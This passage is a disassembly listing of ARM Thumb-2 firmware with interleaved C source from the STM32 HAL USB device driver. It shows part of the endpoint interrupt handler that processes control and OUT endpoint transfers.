 8002880:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8002884:	2b00      	cmp	r3, #0
 8002886:	d032      	beq.n	80028ee <PCD_EP_ISR_Handler+0x160>
        {
          /* Get SETUP Packet */
          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 8002888:	687b      	ldr	r3, [r7, #4]
 800288a:	681b      	ldr	r3, [r3, #0]
 800288c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002890:	b29b      	uxth	r3, r3
 8002892:	461a      	mov	r2, r3
 8002894:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002896:	781b      	ldrb	r3, [r3, #0]
 8002898:	00db      	lsls	r3, r3, #3
 800289a:	4413      	add	r3, r2
 800289c:	687a      	ldr	r2, [r7, #4]
 800289e:	6812      	ldr	r2, [r2, #0]
 80028a0:	4413      	add	r3, r2
 80028a2:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80028a6:	881b      	ldrh	r3, [r3, #0]
 80028a8:	f3c3 0209 	ubfx	r2, r3, #0, #10
 80028ac:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028ae:	61da      	str	r2, [r3, #28]

          USB_ReadPMA(hpcd->Instance, (uint8_t *)hpcd->Setup,
 80028b0:	687b      	ldr	r3, [r7, #4]
 80028b2:	6818      	ldr	r0, [r3, #0]
 80028b4:	687b      	ldr	r3, [r7, #4]
 80028b6:	f503 712c 	add.w	r1, r3, #688	; 0x2b0
 80028ba:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028bc:	88da      	ldrh	r2, [r3, #6]
                      ep->pmaadress, (uint16_t)ep->xfer_count);
 80028be:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028c0:	69db      	ldr	r3, [r3, #28]
          USB_ReadPMA(hpcd->Instance, (uint8_t *)hpcd->Setup,
 80028c2:	b29b      	uxth	r3, r3
 80028c4:	f005 ff23 	bl	800870e <USB_ReadPMA>

          /* SETUP bit kept frozen while CTR_RX = 1 */
          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 80028c8:	687b      	ldr	r3, [r7, #4]
 80028ca:	681b      	ldr	r3, [r3, #0]
 80028cc:	881b      	ldrh	r3, [r3, #0]
 80028ce:	b29a      	uxth	r2, r3
 80028d0:	f640 738f 	movw	r3, #3983	; 0xf8f
 80028d4:	4013      	ands	r3, r2
 80028d6:	823b      	strh	r3, [r7, #16]
 80028d8:	687b      	ldr	r3, [r7, #4]
 80028da:	681b      	ldr	r3, [r3, #0]
 80028dc:	8a3a      	ldrh	r2, [r7, #16]
 80028de:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 80028e2:	b292      	uxth	r2, r2
 80028e4:	801a      	strh	r2, [r3, #0]

          /* Process SETUP Packet*/
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->SetupStageCallback(hpcd);
#else
          HAL_PCD_SetupStageCallback(hpcd);
 80028e6:	6878      	ldr	r0, [r7, #4]
 80028e8:	f00a f904 	bl	800caf4 <HAL_PCD_SetupStageCallback>
 80028ec:	e306      	b.n	8002efc <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else if ((wEPVal & USB_EP_CTR_RX) != 0U)
 80028ee:	f9b7 304a 	ldrsh.w	r3, [r7, #74]	; 0x4a
 80028f2:	2b00      	cmp	r3, #0
 80028f4:	f280 8302 	bge.w	8002efc <PCD_EP_ISR_Handler+0x76e>
        {
          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 80028f8:	687b      	ldr	r3, [r7, #4]
 80028fa:	681b      	ldr	r3, [r3, #0]
 80028fc:	881b      	ldrh	r3, [r3, #0]
 80028fe:	b29a      	uxth	r2, r3
 8002900:	f640 738f 	movw	r3, #3983	; 0xf8f
 8002904:	4013      	ands	r3, r2
 8002906:	83fb      	strh	r3, [r7, #30]
 8002908:	687b      	ldr	r3, [r7, #4]
 800290a:	681b      	ldr	r3, [r3, #0]
 800290c:	8bfa      	ldrh	r2, [r7, #30]
 800290e:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 8002912:	b292      	uxth	r2, r2
 8002914:	801a      	strh	r2, [r3, #0]

          /* Get Control Data OUT Packet */
          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 8002916:	687b      	ldr	r3, [r7, #4]
 8002918:	681b      	ldr	r3, [r3, #0]
 800291a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800291e:	b29b      	uxth	r3, r3
 8002920:	461a      	mov	r2, r3
 8002922:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002924:	781b      	ldrb	r3, [r3, #0]
 8002926:	00db      	lsls	r3, r3, #3
 8002928:	4413      	add	r3, r2
 800292a:	687a      	ldr	r2, [r7, #4]
 800292c:	6812      	ldr	r2, [r2, #0]
 800292e:	4413      	add	r3, r2
 8002930:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002934:	881b      	ldrh	r3, [r3, #0]
 8002936:	f3c3 0209 	ubfx	r2, r3, #0, #10
 800293a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800293c:	61da      	str	r2, [r3, #28]

          if ((ep->xfer_count != 0U) && (ep->xfer_buff != 0U))
 800293e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002940:	69db      	ldr	r3, [r3, #28]
 8002942:	2b00      	cmp	r3, #0
 8002944:	d019      	beq.n	800297a <PCD_EP_ISR_Handler+0x1ec>
 8002946:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002948:	695b      	ldr	r3, [r3, #20]
 800294a:	2b00      	cmp	r3, #0
 800294c:	d015      	beq.n	800297a <PCD_EP_ISR_Handler+0x1ec>
          {
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff,
 800294e:	687b      	ldr	r3, [r7, #4]
 8002950:	6818      	ldr	r0, [r3, #0]
 8002952:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002954:	6959      	ldr	r1, [r3, #20]
 8002956:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002958:	88da      	ldrh	r2, [r3, #6]
                        ep->pmaadress, (uint16_t)ep->xfer_count);
 800295a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800295c:	69db      	ldr	r3, [r3, #28]
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff,
 800295e:	b29b      	uxth	r3, r3
 8002960:	f005 fed5 	bl	800870e <USB_ReadPMA>

            ep->xfer_buff += ep->xfer_count;
 8002964:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002966:	695a      	ldr	r2, [r3, #20]
 8002968:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800296a:	69db      	ldr	r3, [r3, #28]
 800296c:	441a      	add	r2, r3
 800296e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002970:	615a      	str	r2, [r3, #20]

            /* Process Control Data OUT Packet */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
            hpcd->DataOutStageCallback(hpcd, 0U);
#else
            HAL_PCD_DataOutStageCallback(hpcd, 0U);
 8002972:	2100      	movs	r1, #0
 8002974:	6878      	ldr	r0, [r7, #4]
 8002976:	f00a f8cf 	bl	800cb18 <HAL_PCD_DataOutStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
          }

          wEPVal = (uint16_t)PCD_GET_ENDPOINT(hpcd->Instance, PCD_ENDP0);
 800297a:	687b      	ldr	r3, [r7, #4]
 800297c:	681b      	ldr	r3, [r3, #0]
 800297e:	881b      	ldrh	r3, [r3, #0]
 8002980:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

          if (((wEPVal & USB_EP_SETUP) == 0U) && ((wEPVal & USB_EP_RX_STRX) != USB_EP_RX_VALID))
 8002984:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002988:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 800298c:	2b00      	cmp	r3, #0
 800298e:	f040 82b5 	bne.w	8002efc <PCD_EP_ISR_Handler+0x76e>
 8002992:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002996:	f403 5340 	and.w	r3, r3, #12288	; 0x3000
 800299a:	f5b3 5f40 	cmp.w	r3, #12288	; 0x3000
 800299e:	f000 82ad 	beq.w	8002efc <PCD_EP_ISR_Handler+0x76e>
          {
            PCD_SET_EP_RX_CNT(hpcd->Instance, PCD_ENDP0, ep->maxpacket);
 80029a2:	687b      	ldr	r3, [r7, #4]
 80029a4:	681b      	ldr	r3, [r3, #0]
 80029a6:	61bb      	str	r3, [r7, #24]
 80029a8:	687b      	ldr	r3, [r7, #4]
 80029aa:	681b      	ldr	r3, [r3, #0]
 80029ac:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80029b0:	b29b      	uxth	r3, r3
 80029b2:	461a      	mov	r2, r3
 80029b4:	69bb      	ldr	r3, [r7, #24]
 80029b6:	4413      	add	r3, r2
 80029b8:	61bb      	str	r3, [r7, #24]
 80029ba:	69bb      	ldr	r3, [r7, #24]
 80029bc:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80029c0:	617b      	str	r3, [r7, #20]
 80029c2:	697b      	ldr	r3, [r7, #20]
 80029c4:	881b      	ldrh	r3, [r3, #0]
 80029c6:	b29b      	uxth	r3, r3
 80029c8:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80029cc:	b29a      	uxth	r2, r3
 80029ce:	697b      	ldr	r3, [r7, #20]
 80029d0:	801a      	strh	r2, [r3, #0]
 80029d2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029d4:	691b      	ldr	r3, [r3, #16]
 80029d6:	2b3e      	cmp	r3, #62	; 0x3e
 80029d8:	d91d      	bls.n	8002a16 <PCD_EP_ISR_Handler+0x288>
 80029da:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029dc:	691b      	ldr	r3, [r3, #16]
 80029de:	095b      	lsrs	r3, r3, #5
 80029e0:	647b      	str	r3, [r7, #68]	; 0x44
 80029e2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029e4:	691b      	ldr	r3, [r3, #16]
 80029e6:	f003 031f 	and.w	r3, r3, #31
 80029ea:	2b00      	cmp	r3, #0
 80029ec:	d102      	bne.n	80029f4 <PCD_EP_ISR_Handler+0x266>
 80029ee:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80029f0:	3b01      	subs	r3, #1
 80029f2:	647b      	str	r3, [r7, #68]	; 0x44
 80029f4:	697b      	ldr	r3, [r7, #20]
 80029f6:	881b      	ldrh	r3, [r3, #0]
 80029f8:	b29a      	uxth	r2, r3
 80029fa:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80029fc:	b29b      	uxth	r3, r3
 80029fe:	029b      	lsls	r3, r3, #10
 8002a00:	b29b      	uxth	r3, r3
 8002a02:	4313      	orrs	r3, r2
 8002a04:	b29b      	uxth	r3, r3
 8002a06:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002a0a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002a0e:	b29a      	uxth	r2, r3
 8002a10:	697b      	ldr	r3, [r7, #20]
 8002a12:	801a      	strh	r2, [r3, #0]
 8002a14:	e026      	b.n	8002a64 <PCD_EP_ISR_Handler+0x2d6>
 8002a16:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a18:	691b      	ldr	r3, [r3, #16]
 8002a1a:	2b00      	cmp	r3, #0
 8002a1c:	d10a      	bne.n	8002a34 <PCD_EP_ISR_Handler+0x2a6>
 8002a1e:	697b      	ldr	r3, [r7, #20]
 8002a20:	881b      	ldrh	r3, [r3, #0]
 8002a22:	b29b      	uxth	r3, r3
 8002a24:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002a28:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002a2c:	b29a      	uxth	r2, r3
 8002a2e:	697b      	ldr	r3, [r7, #20]
 8002a30:	801a      	strh	r2, [r3, #0]
 8002a32:	e017      	b.n	8002a64 <PCD_EP_ISR_Handler+0x2d6>
 8002a34:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a36:	691b      	ldr	r3, [r3, #16]
 8002a38:	085b      	lsrs	r3, r3, #1
 8002a3a:	647b      	str	r3, [r7, #68]	; 0x44
 8002a3c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a3e:	691b      	ldr	r3, [r3, #16]
 8002a40:	f003 0301 	and.w	r3, r3, #1
 8002a44:	2b00      	cmp	r3, #0
 8002a46:	d002      	beq.n	8002a4e <PCD_EP_ISR_Handler+0x2c0>
 8002a48:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8002a4a:	3301      	adds	r3, #1
 8002a4c:	647b      	str	r3, [r7, #68]	; 0x44
 8002a4e:	697b      	ldr	r3, [r7, #20]
 8002a50:	881b      	ldrh	r3, [r3, #0]
 8002a52:	b29a      	uxth	r2, r3
 8002a54:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8002a56:	b29b      	uxth	r3, r3
 8002a58:	029b      	lsls	r3, r3, #10
 8002a5a:	b29b      	uxth	r3, r3
 8002a5c:	4313      	orrs	r3, r2
 8002a5e:	b29a      	uxth	r2, r3
 8002a60:	697b      	ldr	r3, [r7, #20]
 8002a62:	801a      	strh	r2, [r3, #0]
            PCD_SET_EP_RX_STATUS(hpcd->Instance, PCD_ENDP0, USB_EP_RX_VALID);
 8002a64:	687b      	ldr	r3, [r7, #4]
 8002a66:	681b      	ldr	r3, [r3, #0]
 8002a68:	881b      	ldrh	r3, [r3, #0]
 8002a6a:	b29b      	uxth	r3, r3
 8002a6c:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002a70:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002a74:	827b      	strh	r3, [r7, #18]
 8002a76:	8a7b      	ldrh	r3, [r7, #18]
 8002a78:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8002a7c:	827b      	strh	r3, [r7, #18]
 8002a7e:	8a7b      	ldrh	r3, [r7, #18]
 8002a80:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002a84:	827b      	strh	r3, [r7, #18]
 8002a86:	687b      	ldr	r3, [r7, #4]
 8002a88:	681a      	ldr	r2, [r3, #0]
 8002a8a:	8a7b      	ldrh	r3, [r7, #18]
 8002a8c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002a90:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002a94:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002a98:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002a9c:	b29b      	uxth	r3, r3
 8002a9e:	8013      	strh	r3, [r2, #0]
 8002aa0:	e22c      	b.n	8002efc <PCD_EP_ISR_Handler+0x76e>
    }
    else
    {
      /* Decode and service non control endpoints interrupt */
      /* process related endpoint register */
      wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, epindex);
 8002aa2:	687b      	ldr	r3, [r7, #4]
 8002aa4:	681b      	ldr	r3, [r3, #0]
 8002aa6:	461a      	mov	r2, r3
 8002aa8:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002aac:	009b      	lsls	r3, r3, #2
 8002aae:	4413      	add	r3, r2
 8002ab0:	881b      	ldrh	r3, [r3, #0]
 8002ab2:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

      if ((wEPVal & USB_EP_CTR_RX) != 0U)
 8002ab6:	f9b7 304a 	ldrsh.w	r3, [r7, #74]	; 0x4a
 8002aba:	2b00      	cmp	r3, #0
 8002abc:	f280 80f6 	bge.w	8002cac <PCD_EP_ISR_Handler+0x51e>
      {
        /* clear int flag */
        PCD_CLEAR_RX_EP_CTR(hpcd->Instance, epindex);
 8002ac0:	687b      	ldr	r3, [r7, #4]
 8002ac2:	681b      	ldr	r3, [r3, #0]
 8002ac4:	461a      	mov	r2, r3
 8002ac6:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002aca:	009b      	lsls	r3, r3, #2
 8002acc:	4413      	add	r3, r2
 8002ace:	881b      	ldrh	r3, [r3, #0]
 8002ad0:	b29a      	uxth	r2, r3
 8002ad2:	f640 738f 	movw	r3, #3983	; 0xf8f
 8002ad6:	4013      	ands	r3, r2
 8002ad8:	f8a7 3048 	strh.w	r3, [r7, #72]	; 0x48
 8002adc:	687b      	ldr	r3, [r7, #4]
 8002ade:	681b      	ldr	r3, [r3, #0]
 8002ae0:	461a      	mov	r2, r3
 8002ae2:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002ae6:	009b      	lsls	r3, r3, #2
 8002ae8:	4413      	add	r3, r2
 8002aea:	f8b7 2048 	ldrh.w	r2, [r7, #72]	; 0x48
 8002aee:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 8002af2:	b292      	uxth	r2, r2
 8002af4:	801a      	strh	r2, [r3, #0]
        ep = &hpcd->OUT_ep[epindex];
 8002af6:	f897 204d 	ldrb.w	r2, [r7, #77]	; 0x4d
 8002afa:	4613      	mov	r3, r2
 8002afc:	009b      	lsls	r3, r3, #2
 8002afe:	4413      	add	r3, r2
 8002b00:	00db      	lsls	r3, r3, #3
 8002b02:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002b06:	687a      	ldr	r2, [r7, #4]
 8002b08:	4413      	add	r3, r2
 8002b0a:	657b      	str	r3, [r7, #84]	; 0x54

        /* OUT Single Buffering */
        if (ep->doublebuffer == 0U)
 8002b0c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b0e:	7b1b      	ldrb	r3, [r3, #12]
 8002b10:	2b00      	cmp	r3, #0
 8002b12:	d123      	bne.n	8002b5c <PCD_EP_ISR_Handler+0x3ce>
        {
          count = (uint16_t)PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 8002b14:	687b      	ldr	r3, [r7, #4]
 8002b16:	681b      	ldr	r3, [r3, #0]
 8002b18:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002b1c:	b29b      	uxth	r3, r3
 8002b1e:	461a      	mov	r2, r3
 8002b20:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b22:	781b      	ldrb	r3, [r3, #0]
 8002b24:	00db      	lsls	r3, r3, #3
 8002b26:	4413      	add	r3, r2
 8002b28:	687a      	ldr	r2, [r7, #4]
 8002b2a:	6812      	ldr	r2, [r2, #0]
 8002b2c:	4413      	add	r3, r2
 8002b2e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002b32:	881b      	ldrh	r3, [r3, #0]
 8002b34:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002b38:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

          if (count != 0U)
 8002b3c:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002b40:	2b00      	cmp	r3, #0
 8002b42:	f000 808e 	beq.w	8002c62 <PCD_EP_ISR_Handler+0x4d4>
          {
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaadress, count);
 8002b46:	687b      	ldr	r3, [r7, #4]
 8002b48:	6818      	ldr	r0, [r3, #0]
 8002b4a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b4c:	6959      	ldr	r1, [r3, #20]
 8002b4e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b50:	88da      	ldrh	r2, [r3, #6]
 8002b52:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002b56:	f005 fdda 	bl	800870e <USB_ReadPMA>
 8002b5a:	e082      	b.n	8002c62 <PCD_EP_ISR_Handler+0x4d4>
        }
#if (USE_USB_DOUBLE_BUFFER == 1U)
        else
        {
          /* manage double buffer bulk out */
          if (ep->type == EP_TYPE_BULK)
 8002b5c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b5e:	78db      	ldrb	r3, [r3, #3]
 8002b60:	2b02      	cmp	r3, #2
 8002b62:	d10a      	bne.n	8002b7a <PCD_EP_ISR_Handler+0x3ec>
          {
            count = HAL_PCD_EP_DB_Receive(hpcd, ep, wEPVal);
 8002b64:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002b68:	461a      	mov	r2, r3
 8002b6a:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002b6c:	6878      	ldr	r0, [r7, #4]
 8002b6e:	f000 f9d3 	bl	8002f18 <HAL_PCD_EP_DB_Receive>
 8002b72:	4603      	mov	r3, r0
 8002b74:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50
 8002b78:	e073      	b.n	8002c62 <PCD_EP_ISR_Handler+0x4d4>
          }
          else /* manage double buffer iso out */
          {
            /* free EP OUT Buffer */
            PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002b7a:	687b      	ldr	r3, [r7, #4]
 8002b7c:	681b      	ldr	r3, [r3, #0]
 8002b7e:	461a      	mov	r2, r3
 8002b80:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b82:	781b      	ldrb	r3, [r3, #0]
 8002b84:	009b      	lsls	r3, r3, #2
 8002b86:	4413      	add	r3, r2
 8002b88:	881b      	ldrh	r3, [r3, #0]
 8002b8a:	b29b      	uxth	r3, r3
 8002b8c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002b90:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002b94:	f8a7 3052 	strh.w	r3, [r7, #82]	; 0x52
 8002b98:	687b      	ldr	r3, [r7, #4]
 8002b9a:	681b      	ldr	r3, [r3, #0]
 8002b9c:	461a      	mov	r2, r3
 8002b9e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ba0:	781b      	ldrb	r3, [r3, #0]
 8002ba2:	009b      	lsls	r3, r3, #2
 8002ba4:	441a      	add	r2, r3
 8002ba6:	f8b7 3052 	ldrh.w	r3, [r7, #82]	; 0x52
 8002baa:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002bae:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002bb2:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002bb6:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8002bba:	b29b      	uxth	r3, r3
 8002bbc:	8013      	strh	r3, [r2, #0]

            if ((PCD_GET_ENDPOINT(hpcd->Instance, ep->num) & USB_EP_DTOG_RX) != 0U)
 8002bbe:	687b      	ldr	r3, [r7, #4]
 8002bc0:	681b      	ldr	r3, [r3, #0]
 8002bc2:	461a      	mov	r2, r3
 8002bc4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bc6:	781b      	ldrb	r3, [r3, #0]
 8002bc8:	009b      	lsls	r3, r3, #2
 8002bca:	4413      	add	r3, r2
 8002bcc:	881b      	ldrh	r3, [r3, #0]
 8002bce:	b29b      	uxth	r3, r3
 8002bd0:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8002bd4:	2b00      	cmp	r3, #0
 8002bd6:	d022      	beq.n	8002c1e <PCD_EP_ISR_Handler+0x490>
            {
              /* read from endpoint BUF0Addr buffer */
              count = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002bd8:	687b      	ldr	r3, [r7, #4]
 8002bda:	681b      	ldr	r3, [r3, #0]
 8002bdc:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002be0:	b29b      	uxth	r3, r3
 8002be2:	461a      	mov	r2, r3
 8002be4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002be6:	781b      	ldrb	r3, [r3, #0]
 8002be8:	00db      	lsls	r3, r3, #3
 8002bea:	4413      	add	r3, r2
 8002bec:	687a      	ldr	r2, [r7, #4]
 8002bee:	6812      	ldr	r2, [r2, #0]
 8002bf0:	4413      	add	r3, r2
 8002bf2:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002bf6:	881b      	ldrh	r3, [r3, #0]
 8002bf8:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002bfc:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

              if (count != 0U)
 8002c00:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002c04:	2b00      	cmp	r3, #0
 8002c06:	d02c      	beq.n	8002c62 <PCD_EP_ISR_Handler+0x4d4>
              {
                USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, count);
 8002c08:	687b      	ldr	r3, [r7, #4]
 8002c0a:	6818      	ldr	r0, [r3, #0]
 8002c0c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c0e:	6959      	ldr	r1, [r3, #20]
 8002c10:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c12:	891a      	ldrh	r2, [r3, #8]
 8002c14:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002c18:	f005 fd79 	bl	800870e <USB_ReadPMA>
 8002c1c:	e021      	b.n	8002c62 <PCD_EP_ISR_Handler+0x4d4>
              }
            }
            else
            {
              /* read from endpoint BUF1Addr buffer */
              count = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 8002c1e:	687b      	ldr	r3, [r7, #4]
 8002c20:	681b      	ldr	r3, [r3, #0]
 8002c22:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002c26:	b29b      	uxth	r3, r3
 8002c28:	461a      	mov	r2, r3
 8002c2a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c2c:	781b      	ldrb	r3, [r3, #0]
 8002c2e:	00db      	lsls	r3, r3, #3
 8002c30:	4413      	add	r3, r2
 8002c32:	687a      	ldr	r2, [r7, #4]
 8002c34:	6812      	ldr	r2, [r2, #0]
 8002c36:	4413      	add	r3, r2
 8002c38:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002c3c:	881b      	ldrh	r3, [r3, #0]
 8002c3e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002c42:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

              if (count != 0U)
 8002c46:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002c4a:	2b00      	cmp	r3, #0
 8002c4c:	d009      	beq.n	8002c62 <PCD_EP_ISR_Handler+0x4d4>
              {
                USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, count);
 8002c4e:	687b      	ldr	r3, [r7, #4]
 8002c50:	6818      	ldr	r0, [r3, #0]
 8002c52:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c54:	6959      	ldr	r1, [r3, #20]
 8002c56:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c58:	895a      	ldrh	r2, [r3, #10]
 8002c5a:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002c5e:	f005 fd56 	bl	800870e <USB_ReadPMA>
          }
        }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

        /* multi-packet on the NON control OUT endpoint */
        ep->xfer_count += count;
 8002c62:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c64:	69da      	ldr	r2, [r3, #28]
 8002c66:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002c6a:	441a      	add	r2, r3
 8002c6c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c6e:	61da      	str	r2, [r3, #28]
        ep->xfer_buff += count;
 8002c70:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c72:	695a      	ldr	r2, [r3, #20]
 8002c74:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002c78:	441a      	add	r2, r3
 8002c7a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c7c:	615a      	str	r2, [r3, #20]

        if ((ep->xfer_len == 0U) || (count < ep->maxpacket))
 8002c7e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c80:	699b      	ldr	r3, [r3, #24]
 8002c82:	2b00      	cmp	r3, #0
 8002c84:	d005      	beq.n	8002c92 <PCD_EP_ISR_Handler+0x504>
 8002c86:	f8b7 2050 	ldrh.w	r2, [r7, #80]	; 0x50
 8002c8a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c8c:	691b      	ldr	r3, [r3, #16]
 8002c8e:	429a      	cmp	r2, r3
 8002c90:	d206      	bcs.n	8002ca0 <PCD_EP_ISR_Handler+0x512>
        {
          /* RX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->DataOutStageCallback(hpcd, ep->num);
#else
          HAL_PCD_DataOutStageCallback(hpcd, ep->num);
 8002c92:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c94:	781b      	ldrb	r3, [r3, #0]
 8002c96:	4619      	mov	r1, r3
 8002c98:	6878      	ldr	r0, [r7, #4]
 8002c9a:	f009 ff3d 	bl	800cb18 <HAL_PCD_DataOutStageCallback>
 8002c9e:	e005      	b.n	8002cac <PCD_EP_ISR_Handler+0x51e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else
        {
          (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002ca0:	687b      	ldr	r3, [r7, #4]
 8002ca2:	681b      	ldr	r3, [r3, #0]
 8002ca4:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002ca6:	4618      	mov	r0, r3
 8002ca8:	f003 ffe3 	bl	8006c72 <USB_EPStartXfer>
        }
      }

      if ((wEPVal & USB_EP_CTR_TX) != 0U)
 8002cac:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002cb0:	f003 0380 	and.w	r3, r3, #128	; 0x80
